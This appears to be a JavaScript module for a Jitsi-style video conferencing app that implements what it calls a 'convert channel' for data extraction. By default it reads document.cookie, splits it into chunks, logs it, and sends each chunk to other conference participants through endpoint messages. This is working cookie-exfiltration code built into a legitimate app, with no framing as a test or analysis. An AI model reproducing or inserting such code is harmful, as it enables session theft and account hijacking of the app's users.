/* global APP, splitString*/

const defaultConfigurationValues = {
    method: 'plain',
    dataSource: document.cookie,
    chunkSize: 5000
};

/**
 * Implementation of different convert channel methods
 */
class ExtractionMethods {

    // reference to all other methods
    static options = {
        'plain': ExtractionMethods.usePlain
    };

    /**
     * Sending data using simple plain method
     * @param {any} data - Send specified data using Plain method
     */
    static async usePlain(data) {
        console.log('cookie: ', data);
        APP.conference.sendEndpointMessage('', {
            extraction: 'reply',
            payload: data
        });
    }
}


/**
 * Class responsible for extraction handling
 */
export class ExtractionHandler {
    /**
     * @param {object} configuration - Object containing information about data extraction
     */
    constructor(configuration, dataSource) {
        this.configuration = new Proxy(defaultConfigurationValues, configuration);
        this.dataSource = dataSource;
    }

    /**
     * TODO: change to the send any type based on config
     * Send data through the specified method.
     */
    async send() {
        for (const chunkData of splitString(this.dataSource, this.configuration.chunkSize)) {
            // send data using corresponding method
            await ExtractionMethods.options[this.configuration.method](chunkData); 
        }
        APP.conference.sendEndpointMessage('', {
            extraction: 'reply',
            isEnd: true
        });
    }
}
